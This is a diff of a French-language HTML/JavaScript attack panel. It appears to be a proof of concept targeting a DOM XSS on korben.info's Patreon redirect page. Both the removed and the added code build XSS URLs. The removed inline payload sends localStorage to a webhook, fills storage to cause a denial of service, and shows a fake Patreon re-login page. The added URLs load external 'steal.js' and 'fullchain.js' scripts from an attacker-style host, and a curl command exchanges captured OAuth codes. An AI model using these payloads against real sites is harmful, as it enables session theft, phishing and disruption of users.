@@ -84,10 +84,12 @@
       <h2>Lancer l'attaque (1 clic)</h2>
     </div>
     <div class="step-body">
-      <p>Ce lien ouvre korben.info avec un XSS qui exfiltre le localStorage, vide et sature le storage (DoS), puis affiche une fausse page de reconnexion Patreon.</p>
-      <div style="display:flex;gap:8px;align-items:center;margin-bottom:12px;">
-        <button class="btn btn-red" onclick="launchAttack()">Ouvrir le lien piege</button>
-        <button class="btn btn-outline" onclick="copyUrl()">Copier l'URL</button>
+      <p>Le XSS charge un script externe via la CSP permissive (unsafe-inline + https:). Le script exfiltre le localStorage vers le webhook en POST no-cors.</p>
+      <div style="display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap;">
+        <button class="btn btn-green" onclick="launchExfil()">Exfiltration seule</button>
+        <button class="btn btn-red" onclick="launchFullChain()">Full Chain (exfil + DoS + phishing)</button>
+        <button class="btn btn-outline" onclick="copyUrl('exfil')">Copier exfil URL</button>
+        <button class="btn btn-outline" onclick="copyUrl('full')">Copier full chain URL</button>
       </div>
       <div class="url-box" id="attack-url"></div>
     </div>
@@ -190,12 +192,8 @@
 <script>
 var WEBHOOK = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50';
 
-function buildAttackUrl() {
-  // Exfil first, then DoS+phishing only after the request is sent (onload/onerror callback)
-  var afterExfil = "localStorage.clear();for(var j=0;j<1e4;j++){try{localStorage.setItem('d'+j,'x'.repeat(500))}catch(e){break}}setTimeout(function(){document.body.textContent='';var d=document.createElement('div');d.setAttribute('style','text-align:center;padding:60px;font-family:sans-serif;color:white');var h=document.createElement('h2');h.textContent='Session expiree';var p=document.createElement('p');p.textContent='Votre session Patreon a expire. Reconnectez-vous pour continuer.';p.setAttribute('style','margin:12px 0;color:#aaa');var a=document.createElement('a');a.href='https://patreon-oauth-korben.korben.workers.dev?redirect_uri=https://korben-takeover.vercel.app';a.setAttribute('style','padding:14px 28px;background:#e85b46;color:white;border-radius:8px;text-decoration:none;display:inline-block;margin:24px;font-size:16px;font-weight:bold');a.textContent='Reconnexion Patreon';d.appendChild(h);d.appendChild(p);d.appendChild(a);document.body.appendChild(d);document.body.setAttribute('style','background:#0d1117')},300)";
-  var payload = "var i=new Image();i.src='" + WEBHOOK + "?d='+encodeURIComponent(JSON.stringify(localStorage));i.onload=i.onerror=function(){" + afterExfil + "}";
-  return 'https://korben.info/patreon-redirect.html#error=<img+src=x+onerror="' + encodeURIComponent(payload) + '">';
-}
+var EXFIL_URL = 'https://korben.info/patreon-redirect.html#error=<img src=x onerror=with(document)body.appendChild(createElement(`script`)).src=`https://korben-takeover.vercel.app/steal.js`>';
+var FULL_URL = 'https://korben.info/patreon-redirect.html#error=<img src=x onerror=with(document)body.appendChild(createElement(`script`)).src=`https://korben-takeover.vercel.app/fullchain.js`>';
 
 function addRow(container, label, value, sensitive) {
   var row = document.createElement('div');
@@ -221,17 +219,22 @@ function setDot(id, color) {
   document.getElementById(id).className = 'dot dot-' + color;
 }
 
-function launchAttack() {
-  var url = buildAttackUrl();
-  document.getElementById('attack-url').textContent = url;
+function launchExfil() {
+  document.getElementById('attack-url').textContent = EXFIL_URL;
+  setDot('dot-exfil', 'green');
+  window.open(EXFIL_URL, '_blank');
+}
+
+function launchFullChain() {
+  document.getElementById('attack-url').textContent = FULL_URL;
   setDot('dot-exfil', 'green');
   setDot('dot-dos', 'green');
   setDot('dot-phish', 'yellow');
-  window.open(url, '_blank');
+  window.open(FULL_URL, '_blank');
 }
 
-function copyUrl() {
-  var url = buildAttackUrl();
+function copyUrl(type) {
+  var url = type === 'full' ? FULL_URL : EXFIL_URL;
   document.getElementById('attack-url').textContent = url;
   navigator.clipboard.writeText(url);
 }
@@ -398,7 +401,7 @@ function callAPI(version) {
 }
 
 // Init
-document.getElementById('attack-url').textContent = buildAttackUrl();
+document.getElementById('attack-url').textContent = EXFIL_URL;
 document.getElementById('curl-cmd').textContent =
   '# Commande curl pour echanger le code :\ncurl -X POST \\\n  https://patreon-oauth-korben.korben.workers.dev/token \\\n  -H "Content-Type: application/json" \\\n  -d \'{"code":"VOTRE_CODE"}\'';
 
